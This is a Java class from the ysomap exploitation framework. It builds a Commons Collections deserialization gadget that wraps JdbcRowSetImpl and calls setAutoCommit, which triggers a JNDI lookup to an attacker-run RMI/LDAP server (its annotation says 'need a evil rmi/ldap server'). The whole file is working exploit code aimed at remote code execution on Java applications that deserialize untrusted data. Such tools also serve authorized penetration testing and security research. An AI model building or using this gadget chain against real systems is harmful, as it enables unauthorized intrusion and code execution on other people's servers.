package ysomap.gadget.bullet.collections;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.bullet.Bullet;
import ysomap.gadget.bullet.jdk.JdbcRowSetImplBullet;

import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/3/2
 */
@SuppressWarnings({"rawtypes"})
@Dependencies({"need a evil rmi/ldap server"})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithJNDIBullet extends AbstractTransformerBullet {

    @Require(name="jndiURL",detail="jndi lookup url, like rmi://xxxx")
    public String jndiURL;

    @Override
    public Object getObject() throws Exception {
        initClazz();
        Bullet jdbcRowSetImpl = new JdbcRowSetImplBullet();
        jdbcRowSetImpl.set("jndiURL", jndiURL);
        Object obj = jdbcRowSetImpl.getObject();

        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(obj));
        transformers.add(createInvokerTransformer("setAutoCommit",
                            new Class[] {boolean.class}, new Object[]{true}));
        return createTransformerArray(transformers);
    }
}
